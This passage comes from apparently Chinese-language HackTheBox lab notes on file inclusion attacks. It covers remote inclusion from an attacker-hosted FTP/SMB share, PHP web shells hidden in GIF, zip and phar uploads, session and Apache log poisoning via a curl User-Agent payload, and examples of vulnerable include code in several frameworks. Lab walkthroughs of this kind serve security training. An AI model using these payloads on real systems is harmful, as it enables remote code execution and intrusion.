...</code></pre><p>在本地启动一个服务器，但是需要内网穿透。</p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>如前所述，我们还可以通过FTP协议托管我们的脚本。我们可以使用Python的pyftpdlib启动一个基本的FTP服务器，如下所示：</p><pre><code> sudo python -m pyftpdlib -p 21</code></pre><p>这在http端口被防火墙阻止或<code>http://</code>被WAF阻止的情况下也可能很有用。为了包含我们的脚本，我们可以重复前面的操作，但在URL中使用ftp:&#x2F;&#x2F;方案，如下所示：</p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id</code></pre><p>同样的，一般情况下是需要内网穿透</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>如果易受攻击的web应用程序托管在Windows服务器上（我们可以从HTTP响应标头中的服务器版本中看出这一点），那么我们不需要启用allow_url_include设置来利用RFI，因为我们可以利用SMB协议来包含远程文件。这是因为Windows将远程SMB服务器上的文件视为普通文件，可以使用UNC路径直接引用这些文件。<br>我们可以使用Impacket的smbserver.py启动SMB服务器，默认情况下允许匿名身份验证，如下所示：</p><pre><code>impacket-smbserver -smb2support share $(pwd)Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed</code></pre><p>现在，我们可以通过使用UNC路径（例如\<our_IP>\share\shell.php）来包含我们的脚本，并像前面所做的那样用（&amp;cmd&#x3D;whoami）指定命令：</p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami</code></pre><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami</code></pre><p>正如我们所看到的，这种攻击适用于包括我们的远程脚本，并且我们不需要启用任何非默认设置。然而，我们必须注意，如果我们在同一网络上，这种技术更有可能工作，因为根据Windows服务器配置，默认情况下可能会禁用通过互联网访问远程SMB服务器。</p><p>补充一点impacket-smbserver：</p><pre><code>impacket-smbserver &lt;共享名称&gt; &lt;共享路径&gt;</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><pre><code>target:10.129.29.114攻击目标，利用RFI漏洞执行命令，然后在/中的某个目录下查找flag</code></pre><p>kali：ip：10.10.15.22</p><p>先看一下能不能使用url：</p><pre><code>http://10.129.29.114/index.php?language=http://127.0.0.1:80/index.php</code></pre><p>有页面，可以，启用FTP一个服务器：</p><pre><code>impacket-smbserver -smb2support share ~Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed</code></pre><p>包含shell脚本：</p><pre><code>http://10.129.29.114/index.php?language=ftp://10.10.15.22/shell.php&amp;cmd=id</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)Notice: Undefined variable: p2 in /var/www/html/index.php on line 48</code></pre><p>到处see一see：</p><pre><code>http://10.129.29.114/index.php?language=ftp://10.10.15.22/shell.php&amp;cmd=cd%20/;ls</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>bin boot dev etc exercise home lib lib64 media mnt opt proc root run sbin srv sys tmp usr varNotice: Undefined variable: p2 in /var/www/html/index.php on line 48</code></pre><p>这个exercise文件应该是用户自建的，see一see：</p><pre><code>flag.txtNotice: Undefined variable: p2 in /var/www/html/index.php on line 48</code></pre><p>好家伙，直接找到了</p><p>当然了，如果文件实在没什么头绪，还是建议使用find、locate这类查找的命令</p><h1 id="LFI-and-File-Uploads"><a href="#LFI-and-File-Uploads" class="headerlink" title="LFI and File Uploads"></a>LFI and File Uploads</h1><p>文件上传功能在大多数现代网络应用程序中无处不在，因为用户通常需要通过上传数据来配置他们的配置文件和网络应用程序的使用情况。对于攻击者来说，在后端服务器上存储文件的能力可能会扩展对许多漏洞的利用，例如文件包含漏洞。文件上传攻击模块涵盖了如何利用文件上传表单和功能的不同技术。然而，对于我们将在本节中讨论的攻击，我们不要求文件上传表单易受攻击，而只是允许我们上传文件。如果易受攻击的函数具有代码执行功能，那么无论文件扩展名或文件类型如何，如果我们包含它，我们上传的文件中的代码都将被执行。例如，我们可以上传一个图像文件（例如image.jpg），并在其中存储PHP web shell代码“而不是图像数据”，如果我们通过LFI漏洞将其包括在内，PHP代码将被执行，我们将进行远程代码执行。</p><h2 id="Image-upload"><a href="#Image-upload" class="headerlink" title="Image upload"></a>Image upload</h2><p>图像上传在大多数现代网络应用程序中非常常见，因为如果上传功能被安全编码，上传图像被广泛认为是安全的。但是，如前所述，在这种情况下，漏洞不在文件上传表单中，而是在文件包含功能中。</p><p>我们的第一步是创建一个恶意图像，其中包含一个看起来和工作方式都像图像的PHP web外壳代码。因此，我们将在文件名中使用允许的图像扩展名（例如，shell.gif），并且还应该在文件内容的开头包括图像字节（例如，GIF8），以防上传表单同时检查扩展名和内容类型。我们可以这样做：</p><pre><code>echo &#39;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.gif</code></pre><p>注意：在这种情况下，我们使用GIF图像，因为它的魔法字节很容易键入，因为它们是ASCII字符，而其他扩展的魔法字节是二进制的，我们需要对其进行URL编码。但是，此攻击适用于任何允许的图像或文件类型。文件上传攻击模块对文件类型攻击进行了更深入的研究，这里可以应用相同的逻辑。这里附一个PNG文件的数据结构解读：<a href="https://zhuanlan.zhihu.com/p/397397536">PNG文件解读(2):PNG格式文件结构与数据结构解读—解码PNG数据 - 知乎 (zhihu.com)</a></p><h2 id="上传的文件路径"><a href="#上传的文件路径" class="headerlink" title="上传的文件路径"></a>上传的文件路径</h2><p>一旦我们上传了我们的文件，我们所需要做的就是通过LFI漏洞将其包括在内。要包含上传的文件，我们需要知道上传文件的路径。在大多数情况下，尤其是对于图像，我们可以访问上传的文件，并从其URL获取其路径。在我们的情况下，如果我们在上传图像后检查源代码，我们可以获得其URL：</p><pre><code>&lt;img src=&quot;/profile_images/shell.gif&quot; class=&quot;profile-image&quot; id=&quot;profile-image&quot;&gt;</code></pre><p>注意：正如我们所看到的，我们可以使用<code>/proile_images/shell.gif </code>作为文件路径。如果我们不知道文件上传到哪里，那么我们可以对上传目录进行模糊处理，然后对上传的文件进行模糊处理。尽管这可能并不总是有效的，因为一些web应用程序会正确地隐藏上传的文件。</p><p>有了上传的文件路径，我们所需要做的就是将上传的文件包含在LFI易受攻击的函数中，然后执行PHP代码，如下所示：</p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></pre><h2 id="ZIP-Upload"><a href="#ZIP-Upload" class="headerlink" title="ZIP  Upload"></a><a href="https://www.php.net/manual/en/wrappers.compression.php">ZIP</a>  Upload</h2><p>如前所述，上述技术非常可靠，只要易受攻击的函数允许代码执行，就可以在大多数情况下和大多数web框架中使用。还有一些其他仅使用PHP的技术可以利用PHP包装来实现相同的目标。在上述技术不起作用的某些特定情况下，这些技术可能会变得很方便。<br>我们可以使用<a href="https://www.php.net/manual/en/wrappers.compression.php">zip</a> wrapper 来执行PHP代码。但是，这个包装器在默认情况下没有启用，所以这个方法可能并不总是有效的。要做到这一点，我们可以从创建一个PHP web shell脚本开始，并将其压缩到一个zip档案（名为shell.jpg）中，如下所示：</p><pre><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></pre><pre><code>zip &lt;压缩文件名.zip&gt; &lt;要压缩的文件或目录&gt;通过指定要压缩的文件或目录以及要创建的 ZIP 文件的名称，可以使用 zip 命令创建一个新的 ZIP 文件。</code></pre><p>注意：尽管我们将我们的zip档案命名为（shell.jpg），但一些上传表单仍可能通过内容类型测试将我们的文件检测为zip档案，并禁止其上传，因此如果允许上传zip档案，则此攻击更有可能奏效。</p><p>一旦我们上传了shell.jpg档案，我们就可以将其与zip包装器一起作为(zip:&#x2F;&#x2F;shell.jpg)，然后使用#shell.php（URL编码）引用其中的任何文件。最后，我们可以像对待&amp;cmd&#x3D;id一样执行命令，如下所示：</p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</code></pre><h2 id="Phar-Upload"><a href="#Phar-Upload" class="headerlink" title="Phar Upload"></a>Phar Upload</h2><p>最后，我们可以使用<code>phar://</code> wrapper来获得类似的结果。为此，我们将首先将以下PHP脚本写入<code>shell.PHP</code>文件：</p><pre><code>&lt;?php$phar = new Phar(&#39;shell.phar&#39;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&#39;shell.txt&#39;, &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;);$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);$phar-&gt;stopBuffering();</code></pre><p>这个脚本可以编译成一个phar文件，当被调用时，它会将一个web shell写入一个shell.txt子文件，我们可以与之交互。我们可以将它编译成一个phar文件，并将其重命名为shell.jpg，如下所示：</p><pre><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code></pre><p>现在，我们应该有一个名为shell.jpg的phar文件。一旦我们将其上传到web应用程序，我们可以简单地用phar:&#x2F;&#x2F;调用它并提供其URL路径，然后用&#x2F;shell.txt（URL编码）指定phar子文件，以获得我们用（&amp;cmd&#x3D;id）指定的命令的输出，如下所示：</p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></pre><p>zip和phar包装器方法都应该被视为替代方法，以防第一种方法不起作用，因为我们讨论的第一种方法是这三种方法中最可靠的。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><pre><code>target:159.65.60.16:30331</code></pre><ul><li>使用本节中涵盖的任何技术获得RCE</li></ul><p>先打开网站，找到文件上传页面，上传一下，看看地址：</p><pre><code>&lt;img src=&#39;/profile_images/default.jpg&#39; class=&#39;profile-image&#39; id=&#39;profile-image&#39;&gt;</code></pre><p>在<code>/profile_images/</code>这个目录。</p><p>同时还看到：</p><pre><code>&lt;input type=&quot;file&quot; name=&quot;uploadFile&quot; id=&quot;uploadFile&quot; onchange=&quot;checkFile(this)&quot; accept=&quot;.jpg,.jpeg,.png,.gif,.zip&quot;&gt;</code></pre><p>那攻击面还挺广的，试一下这个不常见的zip方法：</p><pre><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php  adding: shell.php (stored 0%)</code></pre><p>然后上传成功后再找到文件包含漏洞的页面进行测试：</p><pre><code>http://159.65.60.16:30331/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=lshttp://159.65.60.16:30331/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=ls</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>en.php es.php image.jpg index.php profile_images script.js settings.php style.css upload.php </code></pre><p>这里的<code>#</code>要进行url编码，不然没办法解析，这里的<code>#</code>应该是选择解压缩后需要读取的文件。</p><pre><code>http://159.65.60.16:30331/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=cd%20/%20;ls</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>2f40d853e2d4768d87da1c81772bae0a.txt bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var </code></pre><p>读取这个txt文件即可</p><h2 id="PHP-Session-Poisoning"><a href="#PHP-Session-Poisoning" class="headerlink" title="PHP Session Poisoning"></a>PHP Session Poisoning</h2><p>大多数PHP web应用程序都使用PHPSSID cookie，它可以在后端保存特定的用户相关数据，因此web应用程序可以通过其cookie跟踪用户的详细信息。这些详细信息存储在后端的会话文件中，并保存在Linux上的<code>/var/lib/php/sessions/</code>和Windows上的<code>C:\Windows\Temp\</code>中。包含用户数据的文件的名称与带有sess_前缀的PHPSSID cookie的名称相匹配。例如，如果PHPSESSID cookie设置为el4ukv0kqbvoirg7nkp4dncpk3，则其在磁盘上的位置将为<code>/var/lib/php/sessions/sese_el4ukv0kqcbvoirg 7nkp4DNcpk3</code>。<br>在PHP会话中毒攻击中，我们需要做的第一件事是检查我们的PHPSSID会话文件，看看它是否包含我们可以控制和中毒的任何数据。因此，让我们首先检查我们的会话是否设置了PHPSESSID cookie：</p><p>如果我们的PHPSSID cookie值是<code>nhhv8i0o6ua4g88bkdl9u1fdsd</code>，因此它应该存储在<code>/var/lib/php/sessions/sses_nhhv8i0o 6ua4g88 bkdl9U1fdsd</code>中。</p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></pre><p>注意：要执行另一个命令，会话文件必须再次被web shell破坏，因为在我们上次包含之后，它会被&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sses_nhhv8i0o6ua4g88bkdl9u1fdsd覆盖。理想情况下，我们会使用中毒的web shell向web目录写入一个永久的web shell，或者发送一个反向shell以便于交互。</p><h2 id="Server-Log-Poisoning"><a href="#Server-Log-Poisoning" class="headerlink" title="Server Log Poisoning"></a>Server Log Poisoning</h2><p>Apache和Nginx都维护各种日志文件，如access.log和error.log。access.log文件包含有关向服务器发出的所有请求的各种信息，包括每个请求的User Agent标头。由于我们可以控制请求中的用户代理标头，因此我们可以像上面所做的那样使用它来破坏服务器日志。<br>一旦中毒，我们需要通过LFI漏洞包括日志，为此我们需要对日志进行读取访问。默认情况下，Nginx日志可由低权限用户读取（例如www数据），而Apache日志只能由具有高权限的用户读取（如root&#x2F;adm组）。但是，在较旧或配置错误的Apache服务器中，这些日志可能由低特权用户读取。<br>默认情况下，Apache日志在Linux上位于<code>/var/log/apache2/</code>，在Windows上位于<code>C:\xampp\apache\logs\</code> ，而Nginx日志在Linux和Windows上分别位于 <code>/var/log/nginx/</code> 和 <code>C:\nginx\log\</code> 。然而，在某些情况下，日志可能位于不同的位置，因此我们可以使用<a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlist</a> 来模糊它们的位置。</p><p>提示：日志往往很大，在LFI漏洞中加载日志可能需要一段时间才能加载，甚至在最坏的情况下会导致服务器崩溃。因此，在生产环境中要谨慎高效地使用它们，不要发送不必要的请求。</p><pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/log/apache2/access.log</code></pre><p>正如我们所看到的，我们可以阅读日志。该日志包含远程IP地址、请求页面、响应代码和用户代理标头。如前所述，User-Agent标头由我们通过HTTP请求标头控制，因此我们应该能够破坏该值。</p><p>注意：当所有对服务器的请求都被记录下来时，我们可以破坏对web应用程序的任何请求，而不一定像上面所做的那样破坏LFI请求。</p><p>我们也可能通过cURL发送请求来破坏日志，如下所示：</p><pre><code> curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -A &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</code></pre><p>由于日志现在应该包含PHP代码，LFI漏洞应该执行此代码，并且我们应该能够获得远程代码执行。我们可以使用（？cmd&#x3D;id）指定要执行的命令：</p><pre><code>提示：User-Agent头也显示在Linux/proc/目录下的进程文件中。因此，我们可以尝试包含/proc/self/environment或/proc/self-fd/N文件（其中N是PID，通常在0-50之间），我们可能能够对这些文件执行相同的攻击。如果我们没有对服务器日志的读取权限，这可能会变得很方便，但是，这些文件也可能只有特权用户才能读取。</code></pre><p>最后，我们可以在各种系统日志上使用其他类似的日志中毒技术，这取决于我们可以读取访问哪些日志。以下是我们可能能够阅读的一些服务日志：</p><ul><li><code>/var/log/sshd.log</code></li><li><code>/var/log/mail</code></li><li><code>/var/log/vsftpd.log</code></li></ul><p>我们应该首先尝试通过LFI读取这些日志，如果我们确实可以访问它们，我们可以像上面所做的那样尝试毒害它们。例如，如果ssh或ftp服务向我们公开，并且我们可以通过LFI读取它们的日志，那么我们可以尝试登录它们，并将用户名设置为PHP代码，在包含它们的日志后，PHP代码就会执行。邮件服务也是如此，因为我们可以发送一封包含PHP代码的电子邮件，在包含日志后，PHP代码就会执行。我们可以将此技术推广到任何记录我们控制的参数并且可以读取LFI漏洞的日志。</p><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><pre><code>Target: 68.183.36.140:32495 </code></pre><ul><li>使用本节中涵盖的任何技术来获得RCE，然后提交以下命令的输出：pwd</li><li>尝试使用不同的技术获取RCE并读取&#x2F;</li></ul><p>先看一下服务器，是：</p><pre><code>Apache/2.4.41 (Ubuntu) Server at 68.183.36.140 Port 32495</code></pre><p>那么日志文件可能在 <code>/var/log/apache2/</code> 中，尝试读取一下：</p><pre><code>68.183.36.140 - - [17/Jun/2023:02:42:50 +0100] &quot;GET / HTTP/1.1&quot; 200 1429 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43&quot; 68.183.36.140 - -</code></pre><p>发现记录了User-Agent，那么我们通过改变User-Agent的值再包含进行注入，但发现一旦注入shell就会无法访问，后来查看了一下论坛发现是注入的时候 cmd 要用单引号而不是双引号，(lll￢ω￢) <code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p><p>此时：</p><pre><code class="url">http://68.183.36.140:30954/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>language=/var/log/apache2/access.log HTTP/1.1&quot; 200 1471 &quot;-&quot; &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data) &quot; 68.183.36</code></pre><p>再试试session注入：</p><p>我们找到自己的session然后尝试访问它：（注意在session值前面加上<code>sess_</code>）</p><pre><code class="url">http://68.183.36.140:30954/index.php?language=/var/lib/php/sessions/sess_4ll8jppihahcetrkvjte0rci8r</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>selected_language|s:53:&quot;/var/lib/php/sessions/sess_4ll8jppihahcetrkvjte0rci8r&quot;;preference|s:7:&quot;Spanish&quot;; </code></pre><p>我们可以看到，会话文件包含两个值：page，显示所选语言的页面，preference，显示所选择的语言,这应该系统自动选择的，因为我们没有指定过，那看起来我们能控制的只有前半段了，尝试把页面值作为注入语段，即</p><p><code>language=$poisoning</code>,ok,try 一 try：</p><pre><code class="url">http://68.183.36.140:30954/index.php?language=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></pre><p>然后此时如果直接访问<code>/var/lib/php/sessions/sess_4ll8jppihahcetrkvjte0rci8r</code></p><p>注入的值会被覆盖，所以直接传入参数</p><pre><code>http://68.183.36.140:30954/index.php?language=/var/lib/php/sessions/sess_4ll8jppihahcetrkvjte0rci8r&amp;cmd=cd%20/;ls</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>selected_language|s:30:&quot;bin boot c85ee5082f4c723ace6c0796e3a3db09.txt dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var &quot;;preference|s:7:&quot;Spanish&quot;;</code></pre><p>注意：要执行另一个命令，会话文件必须再次被web shell破坏，因为在我们上次包含之后，它会被&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sses_nhhv8i0o6ua4g88bkdl9u1fdsd覆盖。理想情况下，我们会使用中毒的web shell向web目录写入一个永久的web shell，或者发送一个反向shell以便于交互。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> practice </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File inclusion:File Disclosure</title>
      <link href="/2023/06/15/file-inclusion/"/>
      <url>/2023/06/15/file-inclusion/</url>
      
        <content type="html"><![CDATA[<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p>让我们看一些易受文件包含攻击的代码示例，以了解此类漏洞是如何发生的。如前所述，文件包含漏洞可能出现在许多最流行的web服务器和开发框架中，如PHP、NodeJS、Java、.Net等。它们中的每一个都有一种稍微不同的方法来包含本地文件，但它们都有一个共同点：从指定的路径加载文件。<br>这样的文件可以是动态头或基于用户指定语言的不同内容。例如，页面可能有一个？language GET参数，如果用户从下拉菜单中更改语言，则会返回相同的页面，但使用不同的语言参数（例如？language&#x3D;es）。在这种情况下，更改语言可能会更改web应用程序加载页面的目录（例如&#x2F;en&#x2F;或&#x2F;es&#x2F;）。如果我们能够控制正在加载的路径，那么我们可能能够利用此漏洞读取其他文件，并可能实现远程代码执行。</p><span id="more"></span><p>在PHP中，我们可以在加载页面时使用include（）函数来加载本地或远程文件。如果传递到include（）的路径取自用户控制的参数（如GET参数），并且代码没有显式过滤和净化用户输入，那么代码就容易受到文件包含的攻击。以下代码片段显示了一个示例：</p><pre><code>if (isset($_GET[&#39;language&#39;])) &#123;    include($_GET[&#39;language&#39;]);&#125;</code></pre><p>我们看到语言参数被直接传递给include（）函数。因此，我们在语言参数中传递的任何路径都将加载到页面上，包括后端服务器上的任何本地文件。这并不是include（）函数独有的，因为如果我们能够控制传入它们的路径，许多其他PHP函数也会导致同样的漏洞。这样的函数包括includeonce（）、require（）、Requireonce（（）、file_get_contents（）和其他一些函数。</p><p>就像PHP的情况一样，NodeJS web服务器也可以基于HTTP参数加载内容。以下是如何使用GET参数语言控制将哪些数据写入页面的基本示例：</p><pre><code>if(req.query.language) &#123;    fs.readFile(path.join(__dirname, req.query.language), function (err, data) &#123;        res.write(data);    &#125;);&#125;</code></pre><p>正如我们所看到的，从URL传递的任何参数都会被readfile函数使用，然后它会在HTTP响应中写入文件内容。另一个例子是Express.js框架中的render（）函数。下面的示例显示使用语言参数来确定应该从哪个目录中提取about.html页面：</p><pre><code>app.get(&quot;/about/:language&quot;, function(req, res) &#123;    res.render(`/$&#123;req.params.language&#125;/about.html`);&#125;);</code></pre><p>同样的概念也适用于许多其他web服务器。以下示例显示了Java web服务器的web应用程序如何使用include函数基于指定参数包含本地文件：</p><pre><code>&lt;c:if test=&quot;$&#123;not empty param.language&#125;&quot;&gt;    &lt;jsp:include file=&quot;&lt;%= request.getParameter(&#39;language&#39;) %&gt;&quot; /&gt;&lt;/c:if&gt;</code></pre><p>include函数可以将文件或页面URL作为其参数，然后将对象渲染到前端模板中，类似于我们之前在NodeJS中看到的模板。导入函数也可以用于呈现本地文件或URL，例如以下示例：</p><pre><code>&lt;c:import url= &quot;&lt;%= request.getParameter(&#39;language&#39;) %&gt;&quot;/&gt;</code></pre><p>最后，让我们以.NET web应用程序中可能出现的文件包含漏洞为例。Response.WriteFile函数的工作原理与我们前面的所有示例非常相似，因为它为其输入获取文件路径，并将其内容写入响应。该路径可以从用于动态内容加载的GET参数中检索，如下所示：</p><pre><code>@if (!string.IsNullOrEmpty(HttpContext.Request.Query[&#39;language&#39;])) &#123;    &lt;% Response.WriteFile(&quot;&lt;% HttpContext.Request.Query[&#39;language&#39;] %&gt;&quot;); %&gt; &#125;</code></pre><p>此外，@Html.Partial（）函数也可以用于将指定的文件作为前端模板的一部分进行渲染，类似于我们前面看到的：</p><pre><code>@Html.Partial(HttpContext.Request.Query[&#39;language&#39;])</code></pre><p>最后，include函数可以用于呈现本地文件或远程URL，也可以执行指定的文件：</p><pre><code>&lt;!--#include file=&quot;&lt;% HttpContext.Request.Query[&#39;language&#39;] %&gt;&quot;--&gt;</code></pre><p>从以上所有示例中，我们可以看到，任何web服务器和任何开发框架中都可能出现文件包含漏洞，因为所有这些漏洞都提供了加载动态内容和处理前端模板的功能。<br>需要记住的最重要的一点是，上面的一些函数只读取指定文件的内容，而其他函数也执行指定文件。此外，其中一些允许指定远程URL，而另一些仅使用后端服务器本地的文件。<br>下表显示了哪些函数可以执行文件，哪些函数只读取文件内容：</p><table><thead><tr><th><strong>Function</strong></th><th><strong>Read Content</strong></th><th><strong>Execute</strong></th><th><strong>Remote URL</strong></th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr><tr><td><code>include()</code>&#x2F;<code>include_once()</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><code>require()</code>&#x2F;<code>require_once()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><code>file_get_contents()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><code>fopen()</code>&#x2F;<code>file()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><strong>NodeJS</strong></td><td></td><td></td><td></td></tr><tr><td><code>fs.readFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>fs.sendFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>res.render()</code></td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td><strong>Java</strong></td><td></td><td></td><td></td></tr><tr><td><code>include</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>import</code></td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr><tr><td><code>@Html.Partial()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>@Html.RemotePartial()</code></td><td>✅</td><td>❌</td><td>✅</td></tr><tr><td><code>Response.WriteFile()</code></td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td><code>include</code></td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><h1 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h1><p>我们通过指定文件的绝对路径（例如<code>/etc/passwd</code>）来读取文件。如果在<code>include（）</code>函数中使用整个输入而不添加任何内容，这将起作用，如以下示例：</p><pre><code>include($_GET[&#39;language&#39;]);</code></pre><p>在这种情况下，如果我们尝试读取<code>/etc/passwd</code>，那么<code>include（）</code>函数将直接获取该文件。然而，在许多情况下，web开发人员可能会在语言参数后附加或预加一个字符串。例如，语言参数可以用于文件名，并且可以添加在目录之后，如下所示：</p><pre><code>include(&quot;./languages/&quot; . $_GET[&#39;language&#39;]);</code></pre><p>在这种情况下，如果我们试图读取<code>/etc/passwd</code>，那么传递给<code>include（）</code>的路径将是<code>（./languages//etc/passwd）</code>，由于此文件不存在，我们将无法读取任何内容：</p><p>我们可以通过使用相对路径遍历目录来轻松绕过此限制。为此，我们可以添加<code>../</code>在我们的文件名之前，它指的是父目录。例如，如果languages目录的完整路径是<code>/var/www/html/languages/</code>，则使用<code>/index.php</code>将引用父目录上的index.php文件（即<code>/var/www/html/index.php</code>）。</p><p>因此，我们可以使用这个技巧返回几个目录，直到到达根路径（即<code>/</code>），然后指定我们的绝对文件路径（例如<code>../../../etc/passwd</code>），并且文件应该存在：</p><p>它应该在这两种情况下都能起作用。此外，如果我们在根路径（<code>/</code>）并使用..&#x2F;那么我们仍然会停留在根路径上。因此，如果我们不确定web应用程序所在的目录，我们可以添加<code>../</code>很多次</p><h1 id="文件名前缀"><a href="#文件名前缀" class="headerlink" title="文件名前缀"></a>文件名前缀</h1><p>在前面的例子中，我们在目录后面使用了language参数，这样我们就可以遍历路径来读取passwd文件。在某些情况下，我们的输入可能会附加在不同的字符串之后。例如，它可以与前缀一起使用以获得完整的文件名，如以下示例：</p><pre><code>include(&quot;lang_&quot; . $_GET[&#39;language&#39;]);</code></pre><p>在这种情况下，如果我们尝试使用<code>../../..</code>遍历目录<code>/etc/passwd</code>，最后一个字符串将是<code>lang../..//etc/passwd</code>，无效</p><p>我们可以在有效载荷之前加上前缀<code>/</code>，而不是直接使用路径遍历，这应该将前缀视为目录，然后我们应该绕过文件名，能够遍历目录：</p><p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/../../../etc/passwd</code></p><pre><code>注意：这可能并不总是有效的，因为在这个例子中，名为lang_/的目录可能不存在，所以我们的相对路径可能不正确。此外，任何附加到我们输入的前缀都可能破坏我们将在下一节中讨论的一些文件包含技术，例如使用PHP包装器和过滤器或RFI。</code></pre><h1 id="文件名后缀"><a href="#文件名后缀" class="headerlink" title="文件名后缀"></a>文件名后缀</h1><p>另一个非常常见的例子是将扩展附加到语言参数，如下所示：</p><pre><code>include($_GET[&#39;language&#39;] . &quot;.php&quot;);</code></pre><p>这很常见，因为在这种情况下，我们不必每次需要更改语言时都编写扩展。这也可能更安全，因为它可能会限制我们只包括PHP文件。在这种情况下，如果我们尝试读取&#x2F;etc&#x2F;passwd，那么包含的文件将是&#x2F;etc&#x2F;passwd.php，但该文件不存在，我们可以使用几种技术来绕过这一点，我们将在接下来的章节中讨论它们。</p><h1 id="二阶攻击"><a href="#二阶攻击" class="headerlink" 